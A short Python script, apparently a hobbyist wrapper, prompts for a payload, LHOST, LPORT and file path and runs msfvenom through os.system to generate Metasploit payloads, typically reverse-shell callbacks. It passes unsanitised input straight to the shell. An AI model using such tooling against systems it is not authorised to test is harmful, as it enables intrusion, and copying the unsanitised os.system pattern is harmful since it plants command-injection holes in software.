import os
print("[#]MSFVENOM-AUTOMATION[#]")
print("[#]Developed by Yatharth[#]")
print("[#]Follow on Instagram @im.yatharth[#]")
while 1==1:



    bash= input("[msfvenom-automation] >> ")

    if bash=="msfvenom":
        pay=input("[Payload path] >> ")
        lport=input("[LPORT] >> ")
        lhost=input("[LHOST] >> ")
        path=input("[File location with Filename] >> ")

        code1= "msfvenom -p "+pay+" LHOST="+lhost+" LPORT="+lport+ " R > "+path
        os.system(code1)

    elif bash=="help":
        print("Commands\n"+\
            "\n"+\
                "msfvenom                   [Starts the program]\n")

    else:
        print("Command Not Valid..")

    

    


